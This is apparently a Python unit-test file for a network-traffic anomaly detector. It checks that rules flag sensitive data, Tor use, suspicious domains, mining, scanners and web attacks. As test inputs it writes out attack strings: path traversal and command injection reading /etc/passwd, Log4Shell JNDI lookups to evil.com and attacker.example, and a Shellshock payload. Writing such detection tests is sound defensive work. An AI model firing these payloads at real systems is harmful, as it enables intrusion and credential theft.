from __future__ import annotations

import unittest

from sniffhound.anomaly import AnomalyEngine, PortScanDetector
from sniffhound.monitors import DEFAULT_MONITORS, evaluate_packet, normalize_monitor


def _packet(**overrides) -> dict:
    base = {
        "proto": "tcp",
        "ip_version": 4,
        "eth_type": 0x0800,
        "src_ip": "10.0.0.5",
        "dst_ip": "10.0.0.1",
        "src_port": 51234,
        "dst_port": 443,
        "length": 200,
        "payload_len": 0,
        "payload_text": "",
        "payload_hex": "",
        "summary": "",
        "eth_src": "",
        "eth_dst": "",
    }
    base.update(overrides)
    if not base.get("summary"):
        base["summary"] = base["payload_text"]
    return base


class TestSensitiveDataMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str, **overrides) -> set[str]:
        packet = _packet(payload_text=text, summary=text, payload_len=len(text), **overrides)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_credit_card_visa(self):
        self.assertIn("sensitive-credit-card", self._tags("card: 4111111111111111 exp 12/29"))

    def test_credit_card_mastercard(self):
        self.assertIn("sensitive-credit-card", self._tags("card: 5500005555555559"))

    def test_ssn(self):
        self.assertIn("sensitive-ssn", self._tags("SSN 123-45-6789 on file"))

    def test_ssn_does_not_match_phone_number(self):
        # Phone numbers are 3-3-4 grouped, not 3-2-4 like an SSN.
        self.assertNotIn("sensitive-ssn", self._tags("call me at 555-123-4567"))

    def test_private_key(self):
        text = "-----BEGIN RSA PRIVATE KEY-----\nMIIEow==\n-----END RSA PRIVATE KEY-----"
        self.assertIn("sensitive-private-key", self._tags(text))

    def test_openssh_private_key(self):
        text = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaA==\n-----END OPENSSH PRIVATE KEY-----"
        self.assertIn("sensitive-private-key", self._tags(text))

    def test_aws_access_key(self):
        self.assertIn("sensitive-aws-key", self._tags("aws_access_key_id=AKIAIOSFODNN7EXAMPLE"))

    def test_jwt(self):
        text = (
            "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9."
            "eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
        )
        self.assertIn("sensitive-jwt", self._tags(text))

    def test_github_token(self):
        self.assertIn("sensitive-api-token", self._tags("token=ghp_1234567890abcdefghij1234567890abcdEF"))

    def test_slack_token(self):
        # Deliberately not shaped like a real Slack token (no numeric
        # team/bot-id segments) so it can't be mistaken for a live secret by
        # GitHub's push-protection scanner - it only needs to satisfy this
        # project's own (much looser) detection regex in monitors.py.
        self.assertIn("sensitive-api-token", self._tags("xoxb-FAKE-NOT-A-REAL-SLACK-TOKEN"))

    def test_mongodb_connstring_with_credentials(self):
        self.assertIn("sensitive-db-connstring", self._tags("mongodb://admin:S3cr3t@db.internal:27017/prod"))

    def test_postgres_connstring_with_credentials(self):
        self.assertIn("sensitive-db-connstring", self._tags("postgresql://user:hunter2@10.0.0.9:5432/app"))

    def test_benign_text_matches_nothing(self):
        tags = self._tags("normal chat message, nothing sensitive here at all")
        self.assertEqual(tags, set())


class TestTorMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def test_tor_socks_port(self):
        packet = _packet(dst_port=9050)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertIn("tor-port", tags)

    def test_tor_or_port(self):
        packet = _packet(dst_port=9001)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertIn("tor-port", tags)

    def test_ordinary_https_port_is_not_tor(self):
        packet = _packet(dst_port=443)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertNotIn("tor-port", tags)

    def test_onion_v3_address(self):
        text = "Host: facebookwkhpilnemxj7asaniu7vnjjbiltxjqhye3mhbshg7kx5tfyd.onion"
        packet = _packet(payload_text=text, summary=text)
        tags = {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}
        self.assertIn("tor-onion-domain", tags)


class TestSuspiciousDomainMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_high_abuse_tld(self):
        self.assertIn("suspicious-tld", self._tags("Host: free-gift-cards.top"))

    def test_ordinary_tld_is_not_flagged(self):
        self.assertNotIn("suspicious-tld", self._tags("Host: example.com"))

    def test_typosquat_multi_hyphen_domain(self):
        self.assertIn("domain-typosquat-pattern", self._tags("Host: paypal-secure-login.com"))

    def test_ordinary_domain_is_not_flagged_as_typosquat(self):
        self.assertNotIn("domain-typosquat-pattern", self._tags("Host: example.com"))


class TestWebAttackMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_path_traversal(self):
        self.assertIn("path-traversal", self._tags("GET /../../../../etc/passwd HTTP/1.1"))

    def test_path_traversal_url_encoded(self):
        self.assertIn("path-traversal", self._tags("GET /%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1"))

    def test_command_injection_semicolon(self):
        self.assertIn("command-injection", self._tags("input=test; cat /etc/passwd"))

    def test_command_injection_backticks(self):
        self.assertIn("command-injection", self._tags("name=`whoami`"))

    def test_log4shell_jndi_ldap(self):
        self.assertIn("log4shell", self._tags("User-Agent: ${jndi:ldap://evil.com/a}"))

    def test_log4shell_jndi_rmi(self):
        self.assertIn("log4shell", self._tags("X-Api-Version: ${jndi:rmi://attacker.example/x}"))

    def test_shellshock(self):
        self.assertIn("shellshock", self._tags("() { :; }; /bin/bash -c 'echo vulnerable'"))

    def test_ordinary_request_matches_no_web_attack_tags(self):
        tags = self._tags("GET /products?id=42&sort=price HTTP/1.1")
        attack_tags = tags & {"path-traversal", "command-injection", "log4shell", "shellshock"}
        self.assertEqual(attack_tags, set())


class TestPolicyMonitors(unittest.TestCase):
    def setUp(self):
        self.monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]

    def _tags(self, text: str) -> set[str]:
        packet = _packet(payload_text=text, summary=text)
        return {hit["tag"] for hit in evaluate_packet(packet, self.monitors)}

    def test_bittorrent_handshake(self):
        text = "\x13BitTorrent protocol\x00\x00\x00\x00\x00\x10\x00\x05"
        self.assertIn("p2p-bittorrent", self._tags(text))

    def test_stratum_mining_subscribe(self):
        self.assertIn("crypto-mining", self._tags('{"id":1,"method":"mining.subscribe","params":[]}'))

    def test_stratum_mining_notify(self):
        self.assertIn("crypto-mining", self._tags('{"id":null,"method":"mining.notify","params":[]}'))

    def test_sqlmap_user_agent(self):
        text = "GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7.2#stable (http://sqlmap.org)"
        self.assertIn("suspicious-user-agent", self._tags(text))

    def test_nikto_user_agent(self):
        text = "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.00 (Nikto/2.5.0)"
        self.assertIn("suspicious-user-agent", self._tags(text))

    def test_ordinary_browser_user_agent_is_not_flagged(self):
        text = "GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"
        self.assertNotIn("suspicious-user-agent", self._tags(text))


class TestPortScanDetector(unittest.TestCase):
    def test_fires_once_distinct_port_threshold_crossed(self):
        detector = PortScanDetector()
        detector._threshold = 5
        hits = []
        for port in range(1, 6):
            hit = detector.evaluate({"proto": "tcp", "src_ip": "10.0.0.99", "dst_port": port})
            if hit:
                hits.append(hit)
        self.assertEqual(len(hits), 1)
        self.assertIn("10.0.0.99", hits[0]["detail"])

    def test_repeated_connections_to_same_port_do_not_trigger(self):
        detector = PortScanDetector()
        detector._threshold = 5
        hits = [detector.evaluate({"proto": "tcp", "src_ip": "10.0.0.5", "dst_port": 443}) for _ in range(20)]
        self.assertTrue(all(hit is None for hit in hits))

    def test_ignores_non_tcp_udp(self):
        detector = PortScanDetector()
        self.assertIsNone(detector.evaluate({"proto": "icmp", "src_ip": "10.0.0.5", "dst_port": 0}))

    def test_engine_reports_port_scan_with_correct_shape(self):
        engine = AnomalyEngine()
        monitors = [normalize_monitor(item, allow_source=True) for item in DEFAULT_MONITORS]
        hits = []
        for port in range(1, 20):
            hits.extend(
                engine.evaluate({"proto": "tcp", "src_ip": "10.0.0.99", "dst_port": port}, monitors)
            )
        self.assertEqual(len(hits), 1)
        hit = hits[0]
        self.assertEqual(hit["monitor_id"], "builtin-port-scan")
        self.assertEqual(hit["severity"], "high")


class TestNewMonitorsAreStatelessExceptPortScan(unittest.TestCase):
    def test_all_new_monitors_normalize_and_have_unique_ids(self):
        ids = [item["id"] for item in DEFAULT_MONITORS]
        self.assertEqual(len(ids), len(set(ids)))
        for item in DEFAULT_MONITORS:
            normalized = normalize_monitor(item, allow_source=True)
            self.assertEqual(normalized["source"], "builtin")

    def test_port_scan_is_the_only_new_stateful_monitor_besides_prior_four(self):
        stateful_ids = {item["id"] for item in DEFAULT_MONITORS if item.get("mode") == "stateful"}
        self.assertEqual(
            stateful_ids,
            {
                "builtin-arp-spoof",
                "builtin-icmp-flood",
                "builtin-wifi-deauth-flood",
                "builtin-wifi-rogue-ap",
                "builtin-port-scan",
            },
        )


if __name__ == "__main__":
    unittest.main()
